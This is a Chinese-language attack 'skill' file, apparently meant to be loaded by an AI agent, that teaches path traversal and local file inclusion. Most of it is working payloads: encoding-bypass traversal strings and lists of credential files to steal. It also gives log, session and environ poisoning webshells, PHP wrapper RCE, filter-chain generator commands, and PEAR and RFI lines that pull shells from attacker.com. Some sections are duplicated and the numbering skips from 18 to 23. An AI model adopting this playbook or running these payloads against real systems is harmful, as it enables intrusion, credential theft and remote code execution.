# 技能：路径遍历/本地文件包含（LFI）—— 专家攻击手册

> **AI 加载指令**：专家级路径遍历和 LFI 技术。涵盖编码绕过序列、操作系统差异、过滤器绕过、PHP 包装器利用、日志中毒至 RCE，以及路径遍历（仅读取）与 LFI（执行）之间的关键区别。基础模型会遗漏编码链和 RCE 升级路径。

## 0. 相关路由

在深入利用之前，您可以首先加载：

- 当主要攻击面是上传工作流而不是包含或读取原语时，加载 `[upload 不安全文件](../upload-insecure-files/SKILL.md)`
- 当目标是 **Java 后端**（Spring、Jetty、Undertow、Vert.x）且标准 `../`、`%2e%2e`、`%252e` 链被 WAF 阻挡时，加载 `[ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md)` — Ghost Bits 将 `.` 替换为 `阮`（U+962E）并将 `/` 替换为 `阯`（U+962F），通过 Spring CVE-2025-41242 和 Jetty `%2>` 十六进制折叠重新启用遍历

### 第一次遍历链

```text
../etc/passwd
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
..\\..\\..\\windows\\win.ini
```

---

## 1. 核心概念

**路径遍历**：通过 `../` 序列逃避预期目录来读取任意文件。
**LFI**：在 PHP 中，当用户输入控制 `include()`/`require()` — 文件作为 PHP 代码**执行**，而不仅仅是读取。

```
http://target.com/index.php?page=home
→ 打开：/var/www/html/pages/home.php

遍历攻击：
http://target.com/index.php?page=../../../../etc/passwd
→ 打开：/etc/passwd
```

---

## 2. 遍历序列变体

过滤策略决定了使用哪种编码：

### 基本

```
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts  (Windows)
```

### URL 编码

```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     ← %2f = '/'
%2e%2e%5c%2e%2e%5c%2e%2e%5c                  ← %5c = '\'
```

### 双 URL 编码（当服务器一次解码，过滤器在解码前检查）

```
%252e%252e%252f%252e%252e%252f  ← %25 = %, 双重编码的 %2e
..%252f..%252fetc%252fpasswd
```

### Unicode / 过长 UTF-8

```
..%c0%af..%c0%af     ← '/' 的过长 UTF-8 编码
..%c1%9c..%c1%9c     ← '\' 的过长 UTF-8 编码
..%ef%bc%8f          ← 全角实心斜杠 '／'
```

### 混合编码

```
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd   ← 双点加斜杠（过滤器删除单个 ../）
```

### 过滤器删除 `../`（所以 `../` 删除后成为 `../`）

```
....//          ← 删除后成为 ../
..././          ← 删除后成为 ../
```

### 空字节注入（遗留 PHP < 5.3.4）

```
../../../../etc/passwd%00.jpg   ← %00 截断字符串，删除 .jpg 扩展名
../../../../etc/passwd%00.php
```

---

## 3. 目标文件和升级目标

### Linux

```
/etc/passwd                  ← 用户列表（用户名、UID）
/etc/shadow                  ← 密码哈希（需要 root 级别文件读取）
/etc/hosts                   ← 内部主机名 → 桥接目标
/etc/hostname                ← 服务器主机名
/proc/self/environ           ← 进程环境（DB 凭证、API 密钥！）
/proc/self/cmdline           ← 进程命令行
/proc/self/fd/0              ← 标准输入文件描述符
/proc/[pid]/maps             ← 内存映射（加载的库路径）
/var/log/apache2/access.log  ← 用于日志中毒
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log            ← SSH 尝试日志
/var/mail/www-data            ← www-data 用户的电子邮件
/home/USER/.ssh/id_rsa       ← SSH 私钥
/home/USER/.ssh/authorized_keys
/home/USER/.bash_history     ← 命令历史（凭证！）
/home/USER/.aws/credentials  ← AWS 密钥
/tmp/sess_SESSIONID          ← PHP 会话文件（如果 session.save_path=/tmp）
```

### Web 应用配置文件

```
/var/www/html/.env           ← Laravel/Node.js 环境变量
/var/www/html/config.php     ← PHP 配置
/var/www/html/wp-config.php  ← WordPress DB 凭证
/etc/apache2/sites-enabled/  ← Apache vhosts
/etc/nginx/sites-enabled/    ← Nginx 配置
/usr/local/etc/nginx/nginx.conf
```

### Windows

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM          ← NTLM 哈希（通常被锁定）
C:\inetpub\wwwroot\web.config           ← ASP.NET DB 连接字符串
C:\inetpub\wwwroot\global.asa
C:\xampp\htdocs\wp-config.php
C:\Users\Administrator\.ssh\id_rsa
C:\ProgramData\MySQL\MySQL Server 8\my.ini  ← MySQL 配置
```

---

## 4. PHP LFI → RCE 技术

### 日志中毒（当日志可访问时最可靠）

**步骤 1**：通过 User-Agent 向 Apache/Nginx 访问日志注入 PHP 代码：
```http
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```
**步骤 2**：通过 LFI 包含日志文件：
```
?page=../../../../var/log/apache2/access.log&cmd=id
```

### SSH 日志中毒

将 PHP 有效负载作为 SSH 用户名注入：
```bash
ssh '<?php system($_GET["c"]); ?>'@target.com
```
然后包含 `/var/log/auth.log`。

### PHP 会话文件中毒

**步骤 1**：将 PHP 代码发送到会话存储参数（例如，用户名），触发其在会话文件中存储
**步骤 2**：包含会话文件：
```
?page=../../../../tmp/sess_SESSIONID&cmd=id
```
从 cookie `PHPSESSID` 找到会话 ID。

### PHP 包装器用于 RCE

**`php://expect` 包装器**（需要 `expect` PHP 扩展）：
```
?page=expect://id
```

**`php://input` 包装器**（将 LFI 与 POST 正文结合）：
```
POST ?page=php://input
Body: <?php system('id'); ?>
```

**`data://` 包装器**（直接作为 base64 注入 PHP）：
```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```
(PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4= = `<?php system($_GET['cmd']); ?>`)

---

## 5. PHP FILTER 包装器（文件内容读取）

使用 `php://filter` 将文件内容 base64 编码以避免空字节、二进制数据：
```
?page=php://filter/convert.base64-encode/resource=config.php
?page=php://filter/convert.base64-encode/resource=/etc/passwd
?page=php://filter/read=string.rot13/resource=config.php
?page=php://filter/convert.iconv.UTF-8.UTF-16/resource=config.php
```
解码返回的 base64 以查看文件内容（包括 PHP 源代码）。

**链式过滤器**（多个转换以绕过输入过滤器）：
```
?page=php://filter/convert.base64-encode|convert.base64-encode/resource=/etc/passwd
```

---

## 6. 远程文件包含（RFI）— 当启用时

如果 PHP 的 `allow_url_include = On`（很少见但存在）：
```
?page=http://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php
```
托管一个 `shell.txt`，其中包含 `<?php system($_GET['cmd']); ?>`。

---

## 7. 服务器特定路径截断

PHP 有一个历史路径长度限制。用 `.` 或 `/./` 填充以截断附加的扩展名：
```
?page=../../../../etc/passwd/./././././././././././............ (255+ 字符)
```
当服务器附加 `.php` 时，截断会丢失。

或者空字节如果 PHP < 5.3.4：
```
?page=../../../../etc/passwd%00
```

---

## 8. 要测试的参数位置

```
?file=        ?page=        ?include=    ?path=
?doc=         ?view=        ?load=       ?read=
?template=    ?lang=        ?url=        ?src=
?content=     ?site=        ?layout=     ?module=
```

也测试：HTTP 头部、cookie、表单 `action` 值、导入/上传功能。

---

## 9. 过滤器绕过检查清单

当 `../` 被删除或阻止时：

```
□ 尝试 URL 编码： %2e%2e%2f
□ 尝试双重 URL 编码： %252e%252e%252f
□ 尝试过长 UTF-8： ..%c0%af / ..%ef%bc%8f
□ 尝试混合： ..%2F 或 ..%5C (Windows 上的反斜杠)
□ 尝试冗余序列： ....// 或 ..././ (删除一次 → 仍然是 ../)
□ 尝试空字节： /../../../etc/passwd%00
□ 尝试绝对路径： /etc/passwd (如果没有添加路径前缀)
□ 尝试 Windows UNC（Windows 服务器）： \\127.0.0.1\C$\Windows\win.ini
```

---

## 10. 影响升级路径

```
路径遍历（读取任意文件）
├── 读取 /etc/passwd → 列举用户
├── 读取 /proc/self/environ → 在环境中找到 API 密钥、DB 密码
├── 读取应用配置文件 → 找到凭证 → 水平移动
├── 读取 SSH 私钥 → 直接服务器登录
└── 找到日志路径 → 日志中毒 → LFI RCE

LFI（PHP 代码包含）
├── 日志中毒 → Webshell
├── 会话文件中毒 → Webshell  
├── php://input → 直接代码执行
├── data:// → 直接代码执行
└── php://filter → 读取 PHP 源代码 → 找到更多漏洞
```

---

## 11. LFI 至 RCE — 升级路径

| 方法 | 要求 | 有效负载 |
|---|---|---|
| 日志中毒（Apache） | LFI + Apache 访问日志可读 | 注入 `<?php system($_GET['c']);?>` 在 User-Agent → 包含 `/var/log/apache2/access.log` |
| 日志中毒（SSH） | LFI + SSH 认证日志可读 | 作为 `<?php system('id');?>>@target` SSH → 包含 `/var/log/auth.log` |
| 日志中毒（邮件） | LFI + 邮件日志可读 | 发送带有 PHP 的主题的电子邮件 → 包含 `/var/log/mail.log` |
| /proc/self/fd 暴力破解 | LFI + Linux | 暴力破解 `/proc/self/fd/0` 通过 `/proc/self/fd/255` 为包含的文件描述符 |
| /proc/self/environ 中毒 | LFI + CGI/FastCGI | 注入 PHP 在 `User-Agent` 头部 → 包含 `/proc/self/environ` |
| iconv CVE-2024-2961 | glibc < 2.39, PHP 带有 `php://filter` | `php://filter/convert.iconv.UTF-8.ISO-2022-CN-EXT/resource=` 链到堆溢出 → RCE。工具：cnext-exploits |
| phpinfo() 辅助 | LFI + phpinfo 页面可访问 | 竞态条件：通过 multipart 上传到 phpinfo() 的 tmp 文件 → 从响应中读取 tmp 路径 → 在清理前包含 |
| PHP 会话 | LFI + 会话文件可写 | 将 PHP 注入到可控制的会话变量中 → 包含 `/tmp/sess_SESSIONID` 或 `/var/lib/php/sessions/sess_SESSIONID` |
| 上传竞争 | LFI + 上传端点 | 上传 PHP 文件 → 在服务器端验证/删除之前包含 |

---

## 12. PHP 包装器利用矩阵

### php://filter（最强大，始终首先尝试）

```text
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/zlib.deflate/resource=index.php
```

**过滤器链 RCE**（synacktiv php_filter_chain_generator）：

- 链接多个 `convert.iconv` 过滤器以写入任意内容而无需文件上传
- 工具：`synacktiv/php_filter_chain_generator` → 生成链，通过 iconv 转换写入 PHP 代码
- `python3 php_filter_chain_generator.py --chain '<?php system("id");?>'`

**convert.iconv + dechunk oracles**（盲文件读取）：

- 工具：`synacktiv/php_filter_chains_oracle_exploit` (filters_chain_oracle_exploit)
- 启用盲 LFI 逐字符读取文件内容

### php://input

```text
POST vulnerable.php?page=php://input
Body: <?php system('id'); ?>
```

需要 `allow_url_include=On`

### data://

```text
data://text/plain,<?php system('id');?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data:text/plain,<?php system('id');?>>    ← 注意：没有双斜杠变体也有效
```

### phar://

```text
phar://uploaded.phar/test.php
```

触发 phar 元数据的反序列化 → 通过 POP 链 RCE（需要上传定制的 phar，可以伪装为 JPEG）

### zip://

```text
zip://uploaded.zip%23shell.php
```

### expect://

```text
expect://id
expect://ls
# 需要 expect 扩展（很少但请检查）
```

---

## 13. PEARCMD LFI 利用

当 `pearcmd.php` 可通过 LFI 访问（Docker PHP 镜像中常见）：

| 方法 | 有效负载 |
|---|---|
| config-create | `/?file=pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/shell.php` |
| man_dir | `/?file=pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?=phpinfo()?>+-s+` |
| download | `/?file=pearcmd.php&+download+http://attacker.com/shell.php` |
| install | `/?file=pearcmd.php&+install+http://attacker.com/shell.tgz` |

---

## 14. Windows 特定 LFI 技术

**FindFirstFile 通配符**（仅 Windows）：

- `<` 匹配任何单个字符，`>` 匹配任何序列（类似于 `?` 和 `*` 但在文件 API 中）
- `php<<` 可以匹配 `php5`、`phtml` 等。
- `..\..\windows\win.ini` → 使用 `<<` 进行模糊匹配：`..\..\windows\win<<`

---

## 15. 参数命名模式（高频目标）

基于漏洞研究统计分析：

| 参数名称 | 频率 | 上下文 |
|---|---|---|
| `filename`, `file`, `path` | 非常高 | 直接文件操作 |
| `page`, `include`, `template` | 高 | 模板/页面包含 |
| `url`, `src`, `href` | 高 | 资源加载 |
| `download`, `read`, `load` | 中等 | 文件下载/读取 |
| `dir`, `folder`, `root` | 中等 | 目录操作 |
| `hdfile`, `inputFile`, `XFileName` | 低 | CMS/中间件特定 |
| `FileUrl`, `filePath`, `docPath` | 低 | 企业应用特定 |

高频易受攻击端点：

`down.php`, `download.jsp`, `download.asp`, `readfile.php`, `file_download.php`, `getfile.php`, `view.php`

---

## 16. LFI 至 RCE — 升级路径

### 1. /proc/self/fd 暴力破解

```
# 当文件上传存在但路径未知时：
# 上传的文件获得临时 fd 在 /proc/self/fd/
# 暴力破解 fd 编号：
/proc/self/fd/0 通过 /proc/self/fd/255
# 在它被清理之前包含该临时文件
```

### 2. /proc/self/environ 中毒

```
# 如果 User-Agent 反射到进程环境：
GET /vuln.php?page=/proc/self/environ
User-Agent: <?php system($_GET['c']); ?>
```

### 3. 日志中毒

```
# Apache 访问日志：
GET /<?php system($_GET['c']); ?> HTTP/1.1
# 然后 包含：/var/log/apache2/access.log

# SSH 认证日志（用户名字段）：
ssh '<?php system($_GET["c"]); ?>'@target
# 然后 包含：/var/log/auth.log

# 邮件日志（SMTP 主题）：
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
Subject: <?php system($_GET['c']); ?>
.
# 然后 包含：/var/log/mail.log
```

### 4. PHP 会话文件中毒

```
# 设置会话变量为 PHP 代码：
GET /page.php?lang=<?php system($_GET['c']); ?>
# 会话文件：/tmp/sess_SESSIONID 或 /var/lib/php/sessions/sess_SESSIONID
# 包含会话文件
```

### 5. phpinfo() 辅助 LFI

```
# 竞态条件：通过 multipart 上传 tmp 文件到 phpinfo() 
# 1. POST multipart 文件到 phpinfo() 页面 → 揭示 tmp_name (/tmp/phpXXXXXX)
# 2. 在 PHP 清理之前包含 tmp 文件
# 需要许多并发请求（竞态窗口 ~10ms）
```

### 6. iconv CVE-2024-2961

```
# glibc iconv 在 PHP 过滤器链中的缓冲区溢出
# 工具：cfreal/cnext-exploits
# 将 LFI 转换为 XXE、SSRF 或反序列化触发器
```

---

## 17. PHP 包装器利用矩阵

### php://filter（无需执行读取文件）

```text
# base64 编码源代码：
php://filter/convert.base64-encode/resource=index.php

# ROT13：
php://filter/read=string.rot13/resource=index.php

# 链接多个过滤器：
php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# Zlib 压缩：
php://filter/zlib.deflate/resource=index.php

# 新的：过滤器链 RCE (synacktiv php_filter_chain_generator)
# 生成链，通过 iconv 转换写入任意内容
# 工具：synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# 生成：php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=php://temp
```

### convert.iconv + dechunk oracles（盲文件读取）

```
# 错误基础 oracles：确定文件的第一字节是否匹配一个字符
# 工具：synacktiv/php_filter_chains_oracle_exploit
# 逐字节读取文件内容
```

### data:// 包装器

```
# 执行任意 PHP：
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# 当 data:// 被过滤但 data:（没有 //）工作时：
data:text/plain,<?php system('id'); ?>
```

### expect:// 包装器

```
expect://id
expect://ls
# 需要 expect 扩展（很少但请检查）
```

### php://input

```
POST /vuln.php?page=php://input
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

### zip:// 和 phar:// 包装器

```
# zip://: 上传包含 PHP 文件的 ZIP
zip:///tmp/upload.zip#shell.php

# phar://: 触发 phar 元数据的反序列化！
phar:///tmp/upload.phar/anything
# 创建恶意 phar，包含定制的元数据对象
# 可以链接到 RCE 通过 POP 链（如 PHP 反序列化）
# Phar 可以伪装为 JPG（多语言 Phar-jpg）
```

### wrapwrap（前缀/后缀注入）

```
# 工具：ambionics/wrapwrap
# 通过过滤器链为文件内容添加任意前缀和后缀
# 对于将文件读取转换为 XXE、SSRF 或反序列化触发器很有用
```

---

## 18. PEARCMD LFI 至 RCE

当 PEAR 安装且 `register_argc_argv=On`（Docker PHP 镜像中常见）：

```
# 方法 1：config-create（写入任意内容到文件）
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/shell.php

# 方法 2：man_dir（更改文档目录以写入路径）
GET /index.php?+-c+/tmp/shell.php+-d+man_dir=<?=system($_GET[0])?>+-s+/usr/local/lib/php/pearcmd.php

# 方法 3：download（获取远程文件）
GET /index.php?+download+http://attacker.com/shell.php&file=/usr/local/lib/php/pearcmd.php

# 方法 4：install（安装远程软件包）
GET /index.php?+install+http://attacker.com/evil.tgz&file=/usr/local/lib/php/pearcmd.php
```

### Windows FindFirstFile 通配符

```
# Windows << 和 > 通配符在文件路径中：
# << 匹配任何扩展名， > 匹配单个字符
include("php<<");      # 匹配任何 .php* 文件
include("shel>");      # 匹配 shell.php 如果只跟一个字符
# 当确切文件名未知时很有用
```

---

## 23. NODE.JS 路径模块怪癖

### `path.join()` 与 URL 编码输入

```javascript
const path = require('path');

app.get('/files/:name', (req, res) => {
    const filePath = path.join(__dirname, 'uploads', req.params.name);
    res.sendFile(filePath);
});
```

Express URL 解码 `req.params` 之前 `path.join`：

```text
GET /files/..%2f..%2f..%2fetc%2fpasswd
req.params.name = "../../../etc/passwd" (已解码)
path.join(__dirname, 'uploads', '../../../etc/passwd') = /etc/passwd
```

### `express.static()` 怪癖

- 调用 `decodeURIComponent` 在路径上，然后 `path.normalize()`
- 双编码 (`%252e%252e%252f`) 绕过如果中间件解码一次，然后 `express.static` 再次解码
- 空字节 (`%00`) 在现代 Node.js (v14+) 中被拒绝，但遗留版本可能会截断

### `url.parse()` 与 `new URL()` 混淆

```javascript
// 遗留：url.parse() 不解析路径遍历
const parsed = require('url').parse(userInput);
// parsed.pathname 可能包含 ../

// 现代：new URL() 规范化路径
const parsed = new URL(userInput, 'http://localhost');
// parsed.pathname 包含 ../ 解析
```

应用混合 `url.parse()` 和 `path.join()` 可能允许遍历 `new URL()` 会规范化。

---

## 24. IIS 短文件名枚举（~1 波浪号技巧）

### 概念

Windows NTFS 生成 8.3 短文件名（例如，`LONGFI~1.TXT`）。IIS 对有效和无效短名前缀的响应不同。

### 检测方法

```text
GET /W~1.ASP HTTP/1.1  -> 404 (名称模式有效)
GET /Z~1.ASP HTTP/1.1  -> 400 (无效请求)
```

差异响应泄露文件是否以该前缀开头的存在。

### 枚举过程

```text
步骤 1: /A~1* -> 404 = 文件以 A 开头存在
步骤 2: /AB~1* -> 404 = 文件以 AB 开头存在
步骤 3: /ABCDEF~1.A* -> 404 = 扩展名以 A 开头
```

### 工具

```bash
java -jar iis_shortname_scanner.jar https://target.com/
```

### 影响

- 发现隐藏的备份、配置文件、源代码
- 较短的暴力破解空间：8.3 格式限制了字符集
- 即使目录列表被禁用也有效
